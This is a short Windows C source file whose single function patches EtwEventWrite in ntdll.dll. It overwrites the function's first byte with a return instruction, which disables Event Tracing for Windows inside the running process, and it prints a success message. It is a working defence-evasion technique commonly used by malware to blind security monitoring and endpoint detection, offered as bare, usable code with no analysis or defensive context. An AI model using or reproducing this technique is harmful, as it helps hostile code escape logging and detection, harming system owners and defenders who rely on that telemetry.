#include <stdio.h>
#include <Windows.h>

BOOL EtwPatch() {
	
	HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");

	if (hNtdll == NULL) {
		return 0;
	}
	
	PVOID pEtwAddr = GetProcAddress(hNtdll, "EtwEventWrite");
	
	if (pEtwAddr == NULL) {
		return 0;
	}	
	
	DWORD oldProtect = 0;
	if (VirtualProtect(pEtwAddr, 1, PAGE_EXECUTE_READWRITE, &oldProtect)) {
		*(BYTE*)pEtwAddr = 0xC3;
		VirtualProtect(pEtwAddr, 1, oldProtect, &oldProtect);
		FlushInstructionCache(GetCurrentProcess(), pEtwAddr, 1);
		printf("[x] ETW Patched!\n");
		return 1;

	}
	else {
		return 0;
	}

}


